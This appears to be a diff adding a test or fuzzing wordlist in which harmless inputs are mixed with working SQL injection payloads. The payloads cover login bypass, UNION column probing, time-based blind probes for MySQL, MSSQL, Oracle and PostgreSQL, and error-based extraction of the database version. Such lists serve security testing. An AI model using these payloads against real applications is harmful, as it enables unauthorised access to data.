@@ -1,0 +1,38 @@
+'
+"
+test123
+'--
+"--
+normaluser
+' OR '1'='1' --
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+john.doe@example.com
+1' AND '1'='1
+1" AND "1"="1
+' AND 1=1 AND '1'='1
+' AND 1=2 AND '1'='1
+searchterm
+1 OR 1=1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+productname
+' UNION SELECT NULL,NULL,NULL--
+1' AND (SELECT SLEEP(5))--
+' AND SLEEP(5)--
+validinput123
+" AND SLEEP(5)--
+' OR SLEEP(5)#
+1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+hello world
+';WAITFOR DELAY '0:0:5'--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' AND (SELECT 1 FROM PG_SLEEP(5))--
+'XOR(if(now()=sysdate(),sleep(5),0))XOR'
+(SELECT * FROM (SELECT(SLEEP(5)))a)
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1' AND 1=CONVERT(int,(SELECT @@version))--
+' OR '1'='1' /*
